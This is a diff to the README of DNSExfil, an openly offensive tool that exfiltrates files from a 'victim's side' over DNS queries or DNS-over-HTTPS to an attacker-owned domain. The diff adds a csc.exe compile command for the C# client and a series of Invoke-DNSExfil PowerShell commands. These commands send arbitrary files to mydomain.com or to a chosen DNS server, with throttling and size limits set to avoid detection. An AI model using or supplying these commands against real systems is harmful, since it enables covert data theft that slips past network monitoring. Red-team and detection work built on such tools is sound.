@@ -8,7 +8,7 @@ DNSExfil allows for transfering (*exfiltrate*) a file over a DNS request covert 
 DNSExfil has two sides:
   1. The **server side**, coming as a single python script (`dnsexfil.py`), which acts as a custom DNS server, receiving the file
   2. The **client side** (*victim's side*), which comes in three flavors:
-  - `dnsexfil.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable
+  - `dnsexfil.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable using this: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /out:dnsexfil.exe dnsexfil.cs
   - `dnsexfil.ps1`: a PowerShell script providing the exact same functionnalities by wrapping the DNSExfil assembly
 
 In order for the whole thing to work **you must own a domain name** and set the DNS record (NS) for that domain to point to the server that will run the `dnsexfil.py` server side.
@@ -76,5 +76,22 @@ PS c:\DNSExfil> Import-Module .\dnsexfil.ps1
 PS c:\DNSExfil> Invoke-DNSExfil -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
 [...]
 ```
-Check the EXAMPLES section in the script file for further usage examples.
-<img src="https://dl.dropboxusercontent.com/s/067lffd4s45esmu/DNSExfil_02.jpg?dl=0" width="900">
+# Other examples:
+
+  ## Using the system's default DNS server, without any option
+    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password
+
+  ## Using a specific DNS server
+    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -s 192.168.52.134
+  
+  ## Using a specific DNS server, with throttling at 500ms
+    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -s 192.168.52.134 -t 500
+
+  ## Limiting the DNS request size to a maximum of 150 bytes
+    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -r 150
+  
+  ## Limiting the label size to a maximum of 40 characters
+    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -l 40
+  
+  ## Using Google DoH (DNS over HTTP), without any option
+    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -h google
